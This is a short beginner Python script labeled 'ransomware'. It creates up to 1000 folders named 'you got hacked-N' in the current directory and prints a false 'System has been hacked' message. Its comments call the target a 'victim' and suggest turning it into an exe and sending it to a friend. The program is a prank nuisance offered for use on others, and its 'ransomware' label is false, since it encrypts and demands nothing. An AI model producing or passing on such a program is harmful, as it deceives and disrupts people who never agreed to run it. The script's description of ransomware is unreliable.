#******************************Creating an automatic directory(newfolder) creator ransomeware !!***********************************************

# 1. import os and after that I will take an input from the user.
# 2. I''ll create a loop .
# 3. then I will convert  the loop as str

# ****************************************let's started*****************************************

import os
a1 = int(input('>>> how many number you wanna try\nto make folders in a row?: >>>  ')) #you can change this input system or this script from this code and add any of ammount to create folders in the loop
for i in range(1, a1+1):                                                                                                           # I will take input from the users.
    a = "you got hacked-" + str(i)
    os.mkdir(a)
print("System has been hacked!!!!! Check your current directory")

#This code in below can make 1000 new folders in the victim's directory.
#N:B - YOU MUST HAVE TO CAREFUL TO RUN THIS CODE IN YOUR COMPUTER!!!
    #JUST MAKE AN exe FILE AND SEND  IT TO YOUR FRIEND AND ENJOY!
import os
for i in range(1, 1001):
    a = "you got hacked-" + str(i)
    os.mkdir(a)
print("System has been hacked!!!!! Check your current directory")



